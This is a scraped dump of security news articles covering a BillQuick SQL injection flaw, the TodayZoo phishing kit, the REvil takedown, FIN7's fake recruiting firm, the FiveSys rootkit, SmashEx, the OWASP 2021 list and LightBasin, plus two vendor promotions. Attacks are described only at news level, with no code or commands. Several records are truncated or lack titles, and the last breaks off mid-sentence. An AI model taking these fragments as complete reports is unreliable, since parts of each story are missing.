According to its website, BQE Software’s products are used by 400,000 users worldwide.\n“Hackers can use this to access customers’ BillQuick data and run malicious commands on their on-premises Windows servers,“ Huntress Labs threat researcher Caleb Stewart said in a write-up. “This incident highlights a repeating pattern plaguing SMB software: well-established vendors are doing very little to proactively secure their applications and subject their unwitting customers to significant liability when sensitive data is inevitably leaked and/or ransomed.“\n\nEssentially, the vulnerability stems from how BillQuick Web Suite 2020 constructs SQL database queries, enabling attackers to inject a specially-crafted SQL via the application’s login form that could be used to remotely spawn a command shell on the underlying Windows operating system and achieve code execution, which, in turn, is made possible by the fact that the software runs as the “System Administrator“ user.\n“Hackers are constantly looking for low-hanging fruit and vulnerabilities that can be exploited—and they’re not always poking around in ’big’ mainstream applications like Office,“ Stewart said. “Sometimes, a productivity tool or even an add-on can be the door that hackers step through to gain access to an environment and carry out their next move.“\n\n\nFound this article interesting?

{'title': 'Microsoft Warns of TodayZoo Phishing Kit Used in Extensive Credential Stealing Attacks',
'text': 'Microsoft on Thursday disclosed an “extensive series of credential phishing campaigns“ that takes advantage of a custom phishing kit that stitched together components from at least five different widely circulated ones with the goal of siphoning user login information.\nThe tech giant’s Microsoft 365 Defender Threat Intelligence Team, which detected the first instances of the tool in the wild in December 2020, dubbed the copy-and-paste attack infrastructure “TodayZoo.“\n\n“The abundance of phishing kits and other tools available for sale or rent makes it easy for a lone wolf attacker to pick and choose the best features from these kits,“ the researchers said. “They put these functionalities together in a customized kit and try to reap the benefits all to themselves. Such is the case of TodayZoo.“\nPhishing kits, often sold as one time payments in underground forums, are packaged archive files containing images, scripts, and HTML pages that enable a threat actor to set up phishing emails and pages, using them as lures to harvest and transmit credentials to an attacker-controlled server.\n\nThe TodayZoo phishing campaign is no different in that the sender emails impersonate Microsoft, claiming to be password reset or fax and scanner notifications, to redirect victims to credential harvesting pages. Where it stands out is the phishing kit itself, which is cobbled together out of chunks of code taken from other kits — “some available for sale through publicly accessible scam sellers or are reused and repackaged by other kit resellers.“\n\nSpecifically, large parts of the framework appear to have been lifted generously from another kit, known as DanceVida, while imitation and obfuscation-related components significantly overlap with the code from at least five other phishing kits such as Botssoft, FLCFood, Office-RD117, WikiRed, and Zenfo. Despite relying on recycled modules, TodayZoo deviates from DanceVida in the credential harvesting component by replacing the original functionality with its own exfiltration logic.\nIf anything, the “’Frankenstein’s monster characteristic of TodayZoo“ illustrates the diverse ways threat actors leverage phishing kits for nefarious purposes, whether be it by renting them from phishing-as-a-service (PhaaS) providers or by building their own variants from the ground up to suit their objectives.\n“This research further proves that most phishing kits observed or available today are based on a smaller cluster of larger kit ’families,’“ Microsoft’s analysis read. “While this trend has been observed previously, it continues to be the norm, given how phishing kits we’ve seen share large amounts of code among themselves.“\n\n\nFound this article interesting?

'text': 'The Russian-led REvil ransomware gang was felled by an active multi-country law enforcement operation that resulted in its infrastructure being hacked and taken offline for a second time earlier this week, in what’s the latest action taken by governments to disrupt the lucrative ecosystem.\nThe takedown was first reported by Reuters, quoting multiple private-sector cyber experts working with the U.S. government, noting that the May cyber attack on Colonial Pipeline relied on encryption software developed by REvil associates, officially corroborating DarkSide’s connections to the prolific criminal outfit.\n\nCoinciding with the development, blockchain analytics firm Elliptic disclosed that $7 million in bitcoin held by the DarkSide ransomware group were moved through a series of new wallets, with a small fraction of the amount being transferred with each transfer to make the laundered money more difficult to track and convert the funds into fiat currency through exchanges.\nOn Sunday, it emerged that REvil’s Tor payment portal and data leak website had been hijacked by unidentified actors, with a member affiliated with the operation stating that “the server was compromised and they were looking for me,“ leading to speculations of a coordinated law enforcement involvement.\n\nThe increasingly successful and profitable ransomware economy has been typically characterized by a complex tangle of partnerships, with ransomware-as-a-service (RaaS) syndicates such as REvil and DarkSide renting their file-encrypting malware to affiliates recruited through online forums and Telegram channels, who launch the attacks against corporate networks in exchange for a large share of the paid ransom. \nThis service model allows ransomware operators to improve the product, while the affiliates can focus on spreading the ransomware and infecting as many victims as possible to create an assembly line of ransom payouts that can then be split between the developer and themselves. It’s worth noting these affiliates may also turn to other cybercriminal enterprises that offer initial access via persistent backdoors to orchestrate the intrusions.\n\n“Affiliates typically buy corporate access from [Initial Access Brokers] for cheap and then infect those networks with a ransomware product previously obtained by the operators,“ Digital Shadows said in a report published in May 2021. “The rise of these threat actors in addition to the growing importance of RaaS models in the threat landscape indicates an expanding professionalization of cybercriminality.“\nREvil (aka Sodinokibi) shut down for the first time in mid-July 2021 following a string of high-profile attacks aimed at JBS and Kaseya earlier this year, but the crew staged a formal return in early September under the same brand name, even as the U.S. Federal Bureau of Investigation (FBI) stealthily planned to dismantle the threat actor’s malicious activities without their knowledge, as reported by the Washington Post last month.\n“The REvil ransomware gang restored the infrastructure from the backups under the assumption that they had not been compromised,“ Group-IB’s Oleg Skulkin was quoted as saying to Reuters. “Ironically, the gang’s own favorite tactic of compromising the backups was turned against them.“\n\n\nFound this article interesting?

'text': 'A new malware campaign targeting Afghanistan and India is exploiting a now-patched, 20-year-old flaw affecting Microsoft Office to deploy an array of commodity remote access trojans (RATs) that allow the adversary to gain complete control over the compromised endpoints.\nCisco Talos attributed the cyber campaign to a “lone wolf“ threat actor operating a Lahore-based fake IT company called Bunse Technologies as a front to carry out the malicious activities, while also having a history of sharing content that’s in favor of Pakistan and Taliban dating all the way back to 2016.\n\nThe attacks work by taking advantage of political and government-themed lure domains that host the malware payloads, with the infection chains leveraging weaponized RTF documents and PowerShell scripts that distribute malware to victims. Specifically, the laced RTF files were found exploiting CVE-2017-11882 to execute a PowerShell command that’s responsible for deploying additional malware to conduct reconnaissance on the machine.\n\nCVE-2017-11882 concerns a memory corruption vulnerability that could be abused to run arbitrary code The flaw, which is believed to have existed since 2000, was eventually addressed by Microsoft as part of its Patch Tuesday updates for November 2017.\nThe recon phase is followed by a similar attack chain that uses the aforementioned vulnerability to run a series of instructions that culminates in the installation of commodity malware such as DcRAT and QuasarRAT that come with a variety of functionalities right out of the box including remote shells, process management, file management, keylogging, and credential theft, thus requiring minimal efforts on part of the attacker.\n\nAlso observed during the cybercrime operation is a browser credential stealer for Brave, Microsoft Edge, Mozilla Firefox, Google Chrome, Opera, Opera GX, and Yandex Browser.\n“This campaign is a classic example of an individual threat actor employing political, humanitarian and diplomatic themes in a campaign to deliver commodity malware to victims,“ the researchers said. Commodity RAT families are increasingly being used by both crimeware and APT groups to infect their targets. These families also act as excellent launch pads for deploying additional malware against their victims.“\n\n\nFound this article interesting?

'text': 'The financially motivated FIN7 cybercrime gang has masqueraded as yet another fictitious cybersecurity company called “Bastion Secure“ to recruit unwitting software engineers under the guise of penetration testing in a likely lead-up to a ransomware scheme.\n“With FIN7’s latest fake company, the criminal group leveraged true, publicly available information from various legitimate cybersecurity companies to create a thin veil of legitimacy around Bastion Secure,“ Recorded Future’s Gemini Advisory unit said in a report. “FIN7 is adopting disinformation tactics so that if a potential hire or interested party were to fact check Bastion Secure, then a cursory search on Google would return ’true’ information for companies with a similar name or industry to FIN7’s Bastion Secure.“\n\nFIN7, also known as Carbanak, Carbon Spider, and Anunak, has a track record of striking restaurant, gambling, and hospitality industries in the U.S. to infect point-of-sale (POS) systems with malware designed to harvest credit and debit card numbers that are then used or sold for profit on underground marketplaces. The latest development shows the group’s expansion into the highly profitable ransomware landscape.\nSetting up fake front companies is a tried-and-tested formula for FIN7, which has been previously linked to another sham cybersecurity firm dubbed Combi Security that claimed to offer penetration testing services to customers. Viewed in that light, Bastion Secure is a continuation of that tactic.\n\nNot only does the new website feature stolen content compiled from other legitimate cybersecurity firms — primarily Convergent Network Solutions — the operators advertised seemingly genuine hiring opportunities for C++, PHP, and Python programmers, system administrators, and reverse-engineers on popular job boards, offering them several tools for practice assignments during the interview process.\nThese tools were analyzed and found to be components of the post-exploitation toolkits Carbanak and Lizar/Tirion, both of which have been previously attributed to the group and can be leveraged to compromise POS systems and deploy ransomware.\n\nIt’s, however, in the next stage of the hiring process that Bastion Secure’s involvement in criminal activity became evident, what with the company’s representatives providing access to a so-called client company’s network and asking prospective candidates to gather information on domain administrators, file systems, and backups, signalling a strong inclination towards conducting ransomware attacks.\n“Bastion Secure’s job offers for IT specialist positions ranged between $800 and $1,200 USD a month, which is a viable starting salary for this type of position in post-Soviet states,“ the researchers said. “However, this ’salary’ would be a small fraction of a cybercriminal’s portion of the criminal profits from a successful ransomware extortion or large-scale payment card-stealing operation.“\n\nBy paying “unwitting ’employees’ far less than it would have to pay informed criminal accomplices for its ransomware schemes, […] FIN7’s fake company scheme enables the operators of FIN7 to obtain the talent that the group needs to carry out its criminal activities, while simultaneously retaining a larger share of the profits,“ the researchers added.\nBesides posing as a corporate entity, an additional step taken by the actor to give it a ring of authenticity is the fact that one of the company’s office addresses is the same as that of a now-defunct, U.K.-based company named Bastion Security (North) Limited. Web browsers such as Apple Safari and Google Chrome have since blocked access to the deceptive site.\n“Although cybercriminals looking for unwitting accomplices on legitimate job sites is nothing new, the sheer scale and blatancy with which FIN7 operates continue to surpass the behavior shown by other cybercriminal groups,“ the researchers said, adding the group is “attempting to obfuscate its true identity as a prolific cybercriminal and ransomware group by creating a fabricated web presence through a largely legitimate-appearing website, professional job postings, and company info pages on Russian-language business development sites.“\n\n\nFound this article interesting?

{'title': 'Researchers Discover Microsoft-Signed FiveSys Rootkit in the Wild',
'text': 'A newly identified rootkit has been found with a valid digital signature issued by Microsoft that’s used to proxy traffic to internet addresses of interest to the attackers for over a year targeting online gamers in China.\nBucharest-headquartered cybersecurity technology company Bitdefender named the malware “FiveSys,“ calling out its possible credential theft and in-game-purchase hijacking motives. The Windows maker has since revoked the signature following responsible disclosure.\n\n“Digital signatures are a way of establishing trust,“ Bitdefender researchers said in a white paper, adding “a valid digital signature helps the attacker navigate around the operating system’s restrictions on loading third-party modules into the kernel. Once loaded, the rootkit allows its creators to gain virtually unlimited privileges.“\nRootkits are both evasive and stealthy as they offer threat actors an entrenched foothold onto victims’ systems and conceal their malicious actions from the operating system (OS) as well as from anti-malware solutions, enabling the adversaries to maintain extended persistence even after OS reinstallation or replacement of the hard drive.\n\nIn the case of FiveSys, the malware’s main objective is to redirect and route internet traffic for both HTTP and HTTPS connections to malicious domains under the attacker’s control via a custom proxy server. The rootkit operators also employ the practice of blocking the loading of drivers from competing groups using a signature blocklist of stolen certificates to prevent them from taking control of the machine.\n\n“To make potential takedown attempts more difficult, the rootkit comes with a built-in list of 300 domains on the ’.xyz’ [top-level domain],“ the researchers noted. “They seem to be generated randomly and stored in an encrypted form inside the binary.“\nThe development marks the second time wherein malicious drivers with valid digital signatures issued by Microsoft through the Windows Hardware Quality Labs (WHQL) signing process have slipped through the cracks. In late June 2021, German cybersecurity company G Data disclosed details of another rootkit dubbed “Netfilter“ (and tracked by Microsoft as “Retliften“), which, like FiveSys, also aimed at gamers in China.\n\n\nFound this article interesting?

{'title': 'Before and After a Pen Test: Steps to Get Through It',
'text': 'An effective cybersecurity strategy can be challenging to implement correctly and often involves many layers of security. Part of a robust security strategy involves performing what is known as a penetration test (pen test). The penetration test helps to discover vulnerabilities and weaknesses in your security defenses before the bad guys discover these. They can also help validate remedial efforts and solutions put in place to overcome previously discovered security vulnerabilities. \nLet’s look more closely at the pen test. What is included in a penetration test? How are they performed, and by whom? What steps should be taken after a penetration test?\nWhat is a penetration test?1 — Simulated cyberattack\nA penetration test is, for all practical purposes, a simulated cyberattack on your business. However, it is carried out by the “good guys.“ An outside resource often conducts a penetration test, whether a third-party security consulting company or another security entity. Security consultants generally have the security expertise and are staying current with tactics and techniques used by today’s threat actors. 2 — Arranged beforehand\nPenetration tests are arranged with a security consultant days or weeks in advance. Before the penetration test takes place, there is usually an engagement call to understand the scope of the penetration test. Pen tests can be general or can be focused on a specific area or technology for more thorough testing. When arranging for a pen test, a scoping call will help establish the details of the penetration testing and the scope of vulnerabilities being tested.3 — Establish guidelines to prevent disrupting business-critical activities\nThere is always a chance when stressing production infrastructure to cause issues with business-critical production activities. So, while it is good with a pen test to test against your production infrastructure to ensure all potential cybersecurity vulnerabilities are found, it is also good to establish boundaries. For example, there may need to be “blackout“ periods where no disruptive pen testing or intrusive activities occur.4 — Establish cybersecurity goals for the pen test\nThere are various reasons for performing a pen test. These can range from compliance requirements, overall bolstering of cybersecurity defenses, establishing a security baseline, validating security changes or new cybersecurity implementations, and many others. \nThe company carrying out the pen test will generally gather information needed for the pen test. This information may include network names, resources, pertinent user accounts, and other information required to simulate routine day-to-day workflows. These are used to validate the security measures, potential escalation of privileges, weak cybersecurity controls, and other discovery tasks. 5 — Stages of the pen test\nThe stages of a pen test can include but are not limited to the following:\nScope of work, reconnaissance – The goals and scope of the pen test are established, and initial reconnaissance is carried outAutomated pen testing – Automated scanners and other tools may first be used to find open ports, vulnerabilities, and other weaknessesManual pen testing – Subject matter experts may manually perform certain attacks against known technologies and systems.The exploitation of vulnerabilities – If a vulnerability is found, the scope of the vulnerability will be assessed. How far-reaching is the vulnerability? What is criticality?Analysis and report – Pen testers will usually deliver an analysis of the pen test results, ranking the criticality of any vulnerabilities found. Once these are analyzed, a report is usually a part of the deliverables from the pen test.\nTop-rated penetration testing firms\nAccording to Cybersecurity Ventures, the following companies provide top-rated penetration testing services:\nBreachLockBugcrowdCrowdStrikeHackerOneImmuniWebMitnick SecurityOffensive SecurityRaxisSecureLayer7Synack \nLook for reputable pen test companies with a solid track record that aligns with your business. \nSteps to take after a penetration test1 — Consider and review the pen test results\nUsually, one of the deliverables with a pen test is a detailed report of any findings in the environment. These reports provide businesses with the necessary information to move forward with any remediations necessary to close major or critical security gaps. It also helps businesses with bolstering their overall cybersecurity posture. \nIn addition, as many compliance regulations require proof of penetration testing, the delivery of the pen test report provides the documentation needed for compliance audits if requested. \nThe pen test results ultimately provide organizations with the information needed to help ensure any chinks in their cybersecurity armor are resolved with the appropriate measures and cybersecurity solutions if required. In addition, if it is the first pen test performed for the organization, it helps establish the security baseline that is a starting point for improvement. Each subsequent pen test can then gauge the progress of improving overall security. 2 — Remediate findings from the pen test\nPen test results usually are prioritized based on the criticality or likelihood the discovered vulnerability will be exploited. However, it is also wise for businesses to examine the potential repercussions of a successful exploit on the business. In other words, how major would it be for the company if a particular vulnerability is exploited? What systems would be impacted? How will business continuity be affected?\nBusinesses can use the prioritization of any security findings in the pen test report to prioritize the remediation of the vulnerabilities. However, the number and criticality of pen test findings may affect the time needed to remediate the findings. 3 — Repeat the process\nCybersecurity is constantly changing. New threats and risks appear on the scene each day. As a result, bolstering cybersecurity defenses and posture is never-ending. Pen tests are part of the overall process needed to continue checking for vulnerabilities in the environment. Scheduling regular pen tests of the environment allow gaining visibility to new exploits or new findings that may not have existed when the last pen test was performed. \nWith each pen test, the process continues to repeat. Businesses prioritize the findings, learn from these, and remediate the issues based on the criticality and importance assigned. Performing pen tests regularly helps to ensure cybersecurity is not an afterthought, but rather it is a regular part of the overall risk assessment process. \nCredentials and pen tests\nPen test companies often ask for valid credentials to access your environment. It may include credentialed resources. Why? It helps shed light on any potential for access to data they shouldn’t have or other risks. Second, attackers often attack environments using legitimate credentials. \nIn fact, according to the IBM Cost of a Data Breach Report 2021:\nCompromised credentials were the most common initial attack vector, responsible for 20% of breaches. \nThey also take the longest to identify and contain:\nBreaches caused by stolen/compromised credentials took the longest number of days to identify (250) and contain (91) on average, for an average total of 341 days.\nToday, businesses must have strong password policies to help protect against weak or overused passwords and actively protect their environment from breached passwords. How can this be done effectively?\nSpecops Password Policy provides strong Active Directory password policies, allowing organizations to extend the Active Directory password policy capabilities far beyond what is included by default. In addition, with Specops Breached Password Protection, organizations receive continuous protection from breached passwords, helping businesses to protect against end-users using passwords found on breach password lists.\nSpecops Breached Password Protection also protects against newly discovered passwords using brute force or password spraying. Specops integrates newly discovered breached passwords into the Breached Password Protection module using its network of honeypots worldwide that capture breached password telemetry data. The data collected is used to bolster the Breached Password protection provided in Specops Password Policy. \nBreached Password Protection Express list can:\nPrevent users from changing to a leaked passwordContinuously check for leaked passwords and force users to change themNotify users if passwords become breached, and they need to change their password\nSpecops Breached Password Protection\nIn addition to the Express List, the Specops Complete API solution provides additional capabilities. \nSpecops Breached Password Protection Complete API\nAs pen tests often show, credentialed access can have more privileges than needed or access to data they shouldn’t have. On top of ensuring the least privileged access for users, organizations must protect passwords in the environment with strong password policies and breached password protection. Learn more about Specops Password Policy tools and see how you can bolster Active Directory password protection in your environment. \n\n\nFound this article interesting?

{'title': 'Product Overview: Cynet SaaS Security Posture Management (SSPM)',
'text': 'Software-as-a-service (SaaS) applications have gone from novelty to business necessity in a few short years, and its positive impact on organizations is clear. It’s safe to say that most industries today run on SaaS applications, which is undoubtedly positive, but it does introduce some critical new challenges to organizations. \nAs SaaS application use expands, as well as the number of touchpoints they create, the attack surface also becomes significantly larger. \nAs an answer to this emerging challenge, XDR provider Cynet has added a new SaaS Security Posture Management (SSPM) tool to its existing platform (you can learn more here). Regardless of the size of an organization or its security team, managing the security policy and posture of dozens to hundreds of SaaS applications is a complex task, and one that requires the right tools to expedite and optimize. Using SSPM can centralize many of the management and logistics requirements and offer a more unified way to establish security posture and harden existing defenses.\nHow Cynet SSPM helps organizations defend themselves\nTo help organizations harden their SaaS security policy, Cynet 360’s new SSPM offers a variety of protection capabilities. Cynet’s protections provide greater visibility into the organizations’ SaaS ecosystem, including: \nInsights into native SaaS setting configurationsSuggestions to reduce risks by improving existing configurations Single-click automated remediation of incorrect configurations Comparison with industry frameworks with automatic adjustments\nMore importantly, Cynet’s automated tools mean that security teams don’t have to manually review each application’s settings or update each configuration manually once a standard has been created. \n\nAutomated risk detection\nCynet’s SSPM evaluates configuration risks across the company’s SaaS ecosystem. Cynet scans the existing configurations for all an organization’s SaaS apps, identifying areas that could be vulnerable. This allows security teams to be proactive in improving the security posture, rather than waiting for a gap to be exploited. \n\nCynet then automatically prioritizes configuration errors by risk category and tracks all outstanding issues from a single pane of glass.\nSingle-click policy resolutions \nOne of the bigger issues when dealing with a large SaaS ecosystem is standardizing security policies across applications. Especially as organizations can use hundreds of SaaS applications for everything from HR management to project management, manually fixing every single configuration becomes an exhausting and arduous process. \n\nCynet’s SSPM allows for single-click resolution of all security policies across an organization’s environment. When Cynet 360 finds a security risk, it automatically recommends the best-practice configuration settings to eliminate as much of the risk as possible, which users can automatically implement with a single mouse click. \nEnsuring compliance with multiple regulations \nOne issue with using multiple SaaS applications that can often go unmentioned is the difficult position these applications put on regulatory compliance. Because SaaS security isn’t managed entirely by an organization (they’re at least partly managed by third parties), security teams must work harder to ensure every application meets the regulatory requirements of their organizations. \nCynet automatically aligns any SaaS application’s critical security controls to meet regulatory standards, including HIPAA, GDPR, and PCI frameworks that define access and monitoring control. Users can view current security policies, and where they need to be changed to match the required ones. More importantly, configuration errors can be uniformly corrected without having to fix each manually. \n\nA single pane of glass \nCynet’s SSPM is included in the standard Cynet 360 dashboard, meaning that SaaS issues can be detected and remediated without having to access a completely different control center. \nYou can learn more about the new Cynet SSPM during the company’s upcoming webinar (register here).\nTo see more about Cynet SSPM in action, visit the company’s website here. \n\n\nFound this article interesting?

{'title': 'Hackers Stealing Browser Cookies to Hijack High-Profile YouTube Accounts',
'text': 'Since at least late 2019, a network of hackers-for-hire have been hijacking the channels of YouTube creators, luring them with bogus collaboration opportunities to broadcast cryptocurrency scams or sell the accounts to the highest bidder.\nThat’s according to a new report published by Google’s Threat Analysis Group (TAG), which said it disrupted financially motivated phishing campaigns targeting the video platform with cookie theft malware. The actors behind the infiltration have been attributed to a group of hackers recruited in a Russian-speaking forum.\n\n“Cookie Theft, also known as ’pass-the-cookie attack,’ is a session hijacking technique that enables access to user accounts with session cookies stored in the browser,“ TAG’s Ashley Shen said. “While the technique has been around for decades, its resurgence as a top security risk could be due to a wider adoption of multi-factor authentication (MFA) making it difficult to conduct abuse, and shifting attacker focus to social engineering tactics.“\nSince May, the internet giant noted it has blocked 1.6 million messages and restored nearly 4,000 YouTube influencer accounts affected by the social engineering campaign, with some of the hijacked channels selling for anywhere between $3 to $4,000 on account-trading markets depending on the subscriber count.\nFake error window\nOther channels, in contrast, were rebranded for cryptocurrency scams in which the adversary live-streamed videos promising cryptocurrency giveaways in return for an initial contribution, but not before altering the channel’s name, profile picture, and content to spoof large tech or cryptocurrency exchange firms.\nThe attacks involved sending channel owners a malicious link under the ruse of video advertisement collaborations for anti-virus software, VPN clients, music players, photo editing apps, or online games that, when clicked, redirected the recipient to a malware landing site, some of which impersonated legitimate software sites, such as Luminar and Cisco VPN, or masqueraded as media outlets focused on COVID-19.\n\nGoogle said it found no fewer than 15,000 accounts behind the phishing messages and 1,011 domains that were purpose-built to deliver the fraudulent software responsible for executing cookie stealing malware designed to extract passwords and authentication cookies from the victim’s machine and upload them to the actor’s command-and-control servers.\nThe hackers would then use the session cookies to take control of a YouTube creator’s account, effectively circumventing two-factor authentication (2FA), as well as take steps to change passwords and the account’s recovery email and phone numbers.\nFollowing Google’s intervention, the perpetrators have been observed driving targets to messaging apps like WhatsApp, Telegram, and Discord in an attempt to get around Gmail’s phishing protections, not to mention transitioning to other email providers like aol.com, email.cz, seznam.cz, and post.cz. Users are highly recommended to secure their accounts with two-factor authentication to prevent such takeover attacks.\n\n\nFound this article interesting?

{'title': 'Researchers Break Intel SGX With New ’SmashEx’ CPU Attack Technique',
'text': 'A newly disclosed vulnerability affecting Intel processors could be abused by an adversary to gain access to sensitive information stored within enclaves and even run arbitrary code on vulnerable systems.\nThe vulnerability (CVE-2021-0186, CVSS score: 8.2) was discovered by a group of academics from ETH Zurich, the National University of Singapore, and the Chinese National University of Defense Technology in early May 2021, who used it to stage a confidential data disclosure attack called “SmashEx“ that can corrupt private data housed in the enclave and break its integrity.\n\nIntroduced with Intel’s Skylake processors, SGX (short for Software Guard eXtensions) allows developers to run selected application modules in a completely isolated secure compartment of memory, called an enclave or a Trusted Execution Environment (TEE), which is designed to be protected from processes running at higher privilege levels like the operating system. SGX ensures that data is secure even if a computer’s operating system has been tampered with or is under attack.\n“For normal functioning, the SGX design allows the OS to interrupt the enclave execution through configurable hardware exceptions at any point,“ the researchers outlined. “This feature enables enclave runtimes (e.g., Intel SGX SDK and Microsoft Open Enclave) to support in-enclave exception or signal handling, but it also opens up enclaves to re-entrancy bugs. SmashEx is an attack which exploits enclave SDKs which do not carefully handle re-entrancy in their exceptional handling safely.“\n\nIt’s worth noting that an enclave may also have Outside Calls, or OCALLS, which allow enclave functions to call out to the untrusted application and then return to the enclave. But when the enclave is also handling in-enclave exceptions (e.g., timer interrupt or division-by-zero), the vulnerability provides a brief window for a local attacker to hijack the control flow of execution by injecting an asynchronous exception immediately after the enclave is entered.\nArmed with this capability, the adversary can then corrupt the in-enclave memory to leak sensitive data such as RSA private keys or execute malicious code.\nSince SmashEx affects runtimes that support in-enclave exception handling, the researchers noted that “such OCALL return flow and the exception handling flow should be written with care to ensure that they interleave safely,“ and that “when the OCALL return flow is interrupted, the enclave should be in a consistent state for the exception handling flow to progress correctly, and when the exception handling flow completes, the enclave state should also be ready for the enclave to resume.“\n\nIntel has since released software updates to mitigate this vulnerability with SGX SDK versions 2.13 and 2.14 for Windows and Linux respectively. Microsoft, for its part, addressed the issue (CVE-2021-33767) in its July 2021 Patch Tuesday updates with Open Enclave version 0.17.1 of the SDK. The research team’s findings are expected to be presented next month at the ACM Conference on Computer and Communications Security.\n“Asynchronous exception handling is a commodity functionality for real-world applications today, which are increasingly utilizing enclaves,“ the researchers said, adding the research highlights “the importance of providing atomicity guarantees at the OS-enclave interface for such exceptions.“\n\n\nFound this article interesting?

{'title': 'OWASP’s 2021 List Shuffle: A New Battle Plan and Primary Foe',
'text': 'Code injection attacks, the infamous king of vulnerabilities, have lost the top spot to broken access control as the worst of the worst, and developers need to take notice.\nIn this increasingly chaotic world, there have always been a few constants that people could reliably count on: The sun will rise in the morning and set again at night, Mario will always be cooler than Sonic the Hedgehog, and code injection attacks will always occupy the top spot on the Open Web Application Security Project (OWASP) list of the top ten most common and dangerous vulnerabilities that attackers are actively exploiting.\nWell, the sun will rise tomorrow, and Mario still has “one-up“ on Sonic, but code injection attacks have fallen out of the number one spot on the infamous OWASP list, refreshed in 2021. One of the oldest forms of attacks, code injection vulnerabilities have been around almost as long as computer networking. The blanket vulnerability is responsible for a wide range of attacks, including everything from traditional SQL injections to exploits launched against Object Graph Navigation Libraries. It even includes direct assaults against servers using OS injection techniques. The versatility of code injection vulnerabilities for attackers - not to mention the number of places that could potentially be attacked - has kept code injection in the top spot for many years.\nBut the code injection king has fallen. Long live the king. \nDoes that mean we’ve finally solved the injection vulnerability problem? Not a chance. It didn’t fall far from its position as security enemy number one, only down to number three on the OWASP list. It would be a mistake to underestimate the continuing dangers of code injection attacks, but the fact that another vulnerability category was able to surpass it is significant, because it shows just how widespread the new OWASP top dog actually is, and why developers need to pay close attention to it moving forward.\nPerhaps the most interesting thing, however, is that the OWASP Top 10 2021 reflects a significant overhaul, with brand new categories making their debut: Insecure Design, Software and Data Integrity Failures, and an entry based on community survey results: Server-Side Request Forgery. These point to an increasing focus on architectural vulnerabilities, and going beyond surface-level bugs for the benchmark in software security.\nBroken Access Control Takes the Crown (and Reveals a Trend)\nBroken access control rocketed from the fifth spot on the OWASP top ten vulnerabilities list all the way up to the current number one position. Like with code injection and new entries like insecure design, the broken access vulnerability encompasses a wide range of coding flaws, which adds to its dubious popularity as they collectively allow damage on multiple fronts. The category includes any instance where access control policies can be violated so that users can act outside of their intended permissions. \nSome examples of broken access control cited by OWASP in elevating the family of vulnerabilities to the top spot include ones that enable attackers to modify a URL, internal application state, or part of an HTML page. They might also allow users to change their primary access key so that an application, site, or API believes they are someone else, like an administrator with higher privileges. It even includes vulnerabilities where attackers are not restricted from modifying metadata, letting them change things like JSON web tokens, cookies, or access control tokens.\nOnce exploited, this family of vulnerabilities can be used by attackers to bypass file or object authorizations, enables them to steal data, or even perform destructive administrator-level functions like deleting databases. This makes broken access control critically dangerous in addition to being increasingly common.\nIt’s quite compelling - yet not surprising - that authentication and access control vulnerabilities are becoming the most fertile ground for attackers to exploit. Verizon’s latest Data Breach Investigations Report reveals that access control issues are prevalent in almost every industry, especially IT and healthcare, and a whopping 85% of all breaches involved a human element. Now, “human element“ covers incidents like phishing attacks, which are not an engineering problem, but 3% of breaches did involve exploitable vulnerabilities, and according to the report, were predominantly older vulnerabilities and human error-led, like security misconfiguration. \nWhile those decrepit security bugs like XSS and SQL injection continue to trip up developers, increasingly, it has become apparent that core security design is failing, giving way to architectural vulnerabilities that can be very advantageous to a threat actor, especially if they go unpatched after the security flaw in a particular version of an application is made public. \nThe trouble is, few engineers are given training and skills development that goes beyond the basics, and fewer still are truly having their knowledge and practical application expanded beyond localized, code-level bugs that are typically developer-introduced in the first place.\nPreventing the bugs that robots rarely find\nThe newly grouped family of broken access control vulnerabilities is fairly diverse. You can find some specific examples of broken access controls and how to stop them on our YouTube channel and our blog. Or better yet, try for yourself. \nHowever, I think it’s important to celebrate this new OWASP Top 10; indeed, it is more varied, encompassing a wider range of attack vectors that include those that scanners won’t necessarily pick up. For every code-level weakness found, more complex architectural flaws will go unnoticed by most of the security tech stack, no matter how many automated shields and weapons are in the arsenal. While the lion’s share of the OWASP Top 10 list is still compiled based on scanning data, new entries covering insecure design and data integrity failures - among others - show that training horizons for developers need to expand rapidly to achieve what robots cannot.\nPut simply, security scanners don’t make great threat modelers, but a team of security-skilled developers can help the AppSec team immeasurably by growing their security IQ in-line with best practices, as well as the needs of the business. This needs to be factored into a good security program, with the understanding that while the OWASP Top 10 is an excellent baseline, the threat landscape is so fast-paced (not to mention the demands of internal development goals) that there must be a plan to go deeper and more specific with developer upskilling in security. Failure to do so will inevitably lead to missed opportunities to remediate early, and hinder a successful holistic approach to preventative, human-led cybersecurity.\nAbout the Author: Matias Madou is the co-founder and CTO of Secure Code Warrior.

{'title': 'LightBasin Hackers Breach at Least 13 Telecom Service Providers Since 2019',
'text': 'A highly sophisticated adversary named LightBasin has been identified as behind a string of attacks targeting the telecom sector with the goal of collecting “highly specific information“ from mobile communication infrastructure, such as subscriber information and call metadata. \n“The nature of the data targeted by the actor aligns with information likely to be of significant interest to signals intelligence organizations,“ researchers from cybersecurity firm CrowdStrike said in an analysis published Tuesday.\nKnown to be active as far back as 2016, LightBasin (aka UNC1945) is believed to have compromised 13 telecommunication companies across the world since 2019 by leveraging custom tools and their extensive knowledge of telecommunications protocols for scything through organizations’ defenses. The identities of the targeted entities were not disclosed, nor did the findings link the cluster’s activity to a specific country.\n\nIndeed, a recent incident investigated by CrowdStrike found the targeted intrusion actor taking advantage of external DNS (eDNS) servers to connect directly to and from other compromised telecom companies’ GPRS networks via SSH and through previously established backdoors such as PingPong. The initial compromise is facilitated with the help of password-spraying attacks, consequently leading to the installation of SLAPSTICK malware to steal passwords and pivot to other systems in the network.\nOther indications based on telemetry data show the targeted intrusion actor’s ability to emulate GPRS network access points so as to perform command-and-control communications in conjunction with a Unix-based backdoor called TinyShell, thereby enabling the attacker to tunnel traffic through the telecommunications network.\nAmong the multiple tools in LightBasin’s malware arsenal is a network scanning and packet capture utility called “CordScan“ that allows the operators to fingerprint mobile devices, as well as “SIGTRANslator,“ an ELF binary that can transmit and receive data via the SIGTRAN protocol suite, which is used to carry public switched telephone network (PSTN) signaling over IP networks.\n\n“It is not surprising that servers would need to communicate with one another as part of roaming agreements between telecommunications companies; however, LightBasin’s ability to pivot between multiple telecommunications companies stems from permitting all traffic between these organizations without identifying the protocols that are actually required,“ CrowdStrike noted.\n“As such, the key recommendation here is for any telecommunications company to ensure that firewalls responsible for the GPRS network have rules in place to restrict network traffic to only those protocols that are expected, such as DNS or GTP,“ the company added.\nThe findings also come just as cybersecurity firm Symantec disclosed details of a previously unseen advanced persistent threat (APT) group dubbed “Harvester,“ which has been linked to an information-stealing 